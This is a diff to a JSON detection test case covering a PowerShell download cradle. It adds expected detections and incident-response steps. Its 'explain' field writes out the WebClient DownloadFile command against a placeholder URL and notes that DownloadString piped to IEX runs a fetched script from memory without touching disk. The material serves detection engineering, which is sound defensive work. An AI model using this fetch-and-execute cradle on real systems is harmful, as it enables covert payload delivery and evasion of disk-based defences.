@@ -171,6 +171,30 @@
         "proxy",
         "sysmon"
       ]
+    },
+    "validation": {
+      "expected_events": [
+        {
+          "source": "powershell",
+          "description": "Windows - PowerShell Download - Sentinel"
+        },
+        {
+          "source": "sysmon",
+          "event_id": "1",
+          "description": "Process creation (Sysmon)"
+        },
+        {
+          "source": "proxy",
+          "description": "posh_ps_download_cradle_webclient"
+        }
+      ],
+      "success_criteria": "At least one behavioral detection fires within 60 seconds of attack execution",
+      "response_steps": [
+        "Correlate alert with source host, user account, and timestamp",
+        "Review PowerShell Script Block / Module Logs, Sysmon, Web proxy logs for surrounding context (5 min before/after)",
+        "Verify whether the activity matches known administrative baselines or change windows",
+        "If confirmed malicious, isolate the host and escalate to incident response"
+      ]
     }
   },
   "explain": "Downloads a file on Windows with PowerShell's WebClient:\n  New-Object Net.WebClient   create the client\n  .DownloadFile('<url>','C:\\Users\\Public\\out.ps1')   fetch <url> and write it to disk\nSaves the file locally; swap DownloadFile for DownloadString piped to IEX to run a script from memory with no disk write."
